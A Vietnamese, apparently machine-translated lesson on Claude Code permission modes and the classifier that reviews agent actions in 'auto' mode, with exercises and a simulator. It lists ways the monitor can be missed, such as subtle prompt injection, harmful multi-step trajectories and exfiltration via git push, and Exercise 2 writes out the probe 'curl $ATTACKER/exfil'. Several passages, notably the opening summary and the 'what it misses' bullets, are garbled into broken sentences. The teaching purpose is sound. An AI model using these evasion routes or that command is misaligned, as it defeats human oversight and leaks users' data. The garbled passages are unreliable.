# Các chế độ cho phép cho các đại lý tự trị

> Một bậc thang cho phép  mức độ tự trị từ xem xét-mỗi hành động để phê duyệt-mọi thứ  là cách một vòng xoáy điều khiển những gì một đại lý tự trị có thể làm mà không hỏi. Claude Code, ví dụ làm việc của bài học này, cho thấy sáu chế độ như vậy: "kế hoạch" hỏi trước mỗi hành động, "đặc định" (được dán nhãn "Hướng dẫn" trong UI) chỉ yêu cầu những hành động có rủi ro, "tự động chấp nhận Edit" ghi lại file nhưng vẫn xác nhận việc thực hiện shell, và "bypassPermissions" chấp nhận mọi thứ. Chế độ tự động  `auto`chế độ cho phép thay thế cho việc chấp thuận mỗi hành động bằng một mô hình phân loại riêng biệt xem xét từng hành động trước khi nó chạy và chặn bất cứ điều gì leo thang vượt quá yêu cầu của yêu cầu.`max_turns`và `max_budget_usd`. Sự sẵn có của `auto`phụ thuộc vào kế hoạch, kích hoạt, mô hình và nhà cung cấp  và Anthropic rõ ràng rằng phân loại không đủ một mình.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## Vấn đề

Một đại lý lập mã tự trị trên máy tính của bạn là một loại bảo mật riêng biệt. bề mặt tấn công là mọi thứ mà đại lý có thể tiếp cận  hệ thống tập tin, mạng, thông tin tín dụng, bảng ghi, bất kỳ tab trình duyệt nào, bất kỳ thiết bị kết thúc nào mở. Bruce Schneier và những người khác đã đánh dấu công khai điều này: đại lý sử dụng máy tính không phải là "sự cập nhật tính năng" của chatbot, họ là một loại công cụ mới với một loại hình hồ sơ rủi ro mới.

Hệ thống quyền phép của Claude Code là câu trả lời của Anthropic. Thay vì một chuyển đổi "tự trị / không tự trị", có sáu chế độ trải dài một dãy khả năng: kế hoạch → mặc định → chấp nhậnEdits → ... → bypassPermissions. Mỗi chế độ là một sự thỏa hiệp khác nhau giữa tốc độ và xem xét mỗi hành động. Chế độ tự động (March 2026) thêm một mô hình phân loại riêng biệt làm việc chuyển sự chấp thuận khỏi con đường quan trọng của người dùng: nó xem xét từng hành động trước khi nó chạy và chặn bất cứ điều gì leo thang vượt quá yêu cầu.

Câu hỏi kỹ thuật: hệ thống này bắt được gì, nó bỏ lỡ gì, và chế độ nào thực sự đảm bảo một nhiệm vụ nhất định?

## Khái niệm

### 6 chế độ cho phép

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(Tên trên phù hợp với tài liệu Claude Code công cộng; nhãn UI `default`như "Hướng dẫn")

### Chế độ tự động trong một trang

Chế độ tự động (được ra mắt ngày 24 tháng 3 năm 2026) là chế độ cho phép đầu tiên để ủy quyền phê duyệt mỗi hành động cho một mô hình.

1. **A separate classifier model.**Xem xét mọi hành động được đề xuất trước khi nó chạy, đánh giá dựa trên nhiệm vụ được tuyên bố và tình trạng hiện tại của phiên, và chặn bất cứ điều gì leo thang vượt quá yêu cầu. Các hành động bị chặn rơi lại cho người dùng.
2. **Gated availability.**Dù `auto`được cung cấp hoàn toàn phụ thuộc vào kế hoạch, tổ chức cho phép, mô hình, và nhà cung cấp.

Các kiểm soát ngân sách nằm cạnh phân loại:

- `max_turns` tổng số lần lặp lại trong một phiên.
- `max_budget_usd` Tầu giá trị đô la làm giảm phiên họp.
- giới hạn số hành động cho mỗi công cụ (không quá N `WebFetch`gọi điện, vv.).

### Hệ thống bắt được gì

- Đúng cho trước tiêm nhanh vào đầu vào công cụ nơi hướng dẫn tiêm được lập bản đồ đến một hình thức hành động có nguy cơ được biết đến.
- Các vòng lặp công cụ lặp lại  trình phân loại có thể thấy hành động N+1 gần giống với hành động N, năm lần liên tiếp.
- Rõ ràng là ngoài phạm vi của lệnh shell trên một phiên chỉ chỉnh sửa tập tin.

### Hệ thống có thể bỏ lỡ những gì

- **Subtle prompt injection**Điều này có thể được thực hiện bằng cách tạo ra một hành động được đánh dấu.
- **Semantic-level misbehavior.**Mỗi hành động cá nhân có thể trông an toàn trong khi quỹ đạo được tạo thành là có hại.
- **Exfiltration through legitimate channels.**Sau đó, bạn sẽ viết dữ liệu vào một tập tin mà bạn sở hữu.`git push`Một số hành động được phép được thực hiện theo chuỗi các quy trình của các công ty.

### Quá trình xem trước nghiên cứu

Anthropic đã đưa ra chế độ tự động như một bản xem trước nghiên cứu. Tài liệu rõ ràng rằng trình phân loại là một lớp, không phải là một giải pháp: người dùng được kỳ vọng kết hợp chế độ tự động với ngân sách, danh sách cho phép, không gian làm việc riêng biệt và kiểm toán quỹ đạo (Dạy học 1216). Các khung xem trước cũng phản ánh khoảng cách đánh giá chống triển khai được ghi chép (Dạy 1)  một phân loại vượt qua các đánh giá ngoại tuyến có thể cư xử khác nhau trong một phiên thực khi ngữ cảnh của người dùng là mơ hồ.

### Ở đâu cái thang này sống trong dòng công việc của bạn

- Nhiệm vụ không quen thuộc: bắt đầu `plan`Đọc kế hoạch rẻ hơn là quay lại một lần không tốt.
- Phân tích được biết đến: `acceptEdits`tiết kiệm rất nhiều click xác nhận.
- Tiếp tục chạy nền không giám sát: `auto`Chỉ trong một không gian làm việc mà bán kính nổ bạn đã đo (không có giấy chứng nhận, không có đính kèm sản xuất, không có lối ra bạn không chọn).
- Các thùng chứa: `dontAsk`- `bypassPermissions`được chấp nhận nếu và chỉ khi container và giấy chứng nhận của nó được sử dụng một lần.

```figure
autonomy-oversight
```

## Sử dụng nó

`code/main.py`mô phỏng một phân loại đánh giá hành động như một đường ống hai giai đoạn  một đơn giản hóa giảng dạy; thực tế `auto`chế độ được hỗ trợ bởi một mô hình phân loại riêng biệt, không phải là một hợp đồng hai giai đoạn được ghi chép. giai đoạn 1 là một quy tắc từ khóa rẻ hơn các hành động được đề xuất; giai đoạn 2 là một trình xem xét nhiều quy tắc chậm hơn. Người lái xe cung cấp trong một quỹ đạo tổng hợp ngắn (các hành động an toàn, một nỗ lực tiêm nhanh, một vòng lặp lặp lặp) và cho thấy phân loại bắt được và bị bỏ lỡ ở đâu.

## Chuyển nó

`outputs/skill-permission-mode-picker.md`phù hợp với mô tả nhiệm vụ với chế độ quyền phù hợp, giới hạn ngân sách và sự cô lập cần thiết.

## Các bài tập

1. Đi chạy`code/main.py`Phụ thể hành động tổng hợp nào không bao giờ được Phase 1 đánh dấu nhưng luôn bị Phase 2 đánh dấu?

2. Lợi ích của các phương pháp này là:`curl $ATTACKER/exfil`(b) đo tỷ lệ dương tính sai trên mẫu tác dụng lành tính.

3. Đọc tài liệu "How the agent loop works" của Anthropic.`default`Mode. Bạn cần phải cổng riêng biệt trước khi chạy`auto`không có người giám sát?

4. Thiết kế ngân sách hoạt động 24 giờ không giám sát: `max_turns`- `max_budget_usd`, mỗi công cụ, các con số, biện minh cho mỗi số.

5. Mô tả một quỹ đạo mà mỗi hành động được phân loại chấp thuận bởi bộ phân loại, nhưng hành vi được tạo thành không phù hợp. (Dạy học 14 bao gồm cách các chuyển đổi giết người và mã thông báo canary giải quyết vấn đề này).

## Các điều khoản chính

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## Đọc thêm

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) Các chế độ cho phép, ngân sách, định dạng hành động.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Mô hình thực hiện dịch vụ quản lý
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) tính năng bề mặt và thông báo chế độ tự động.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) lớp dựa trên lý do tạo ra các phán quyết phân loại.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Quan điểm nội bộ về thiết kế giấy phép đường dài.
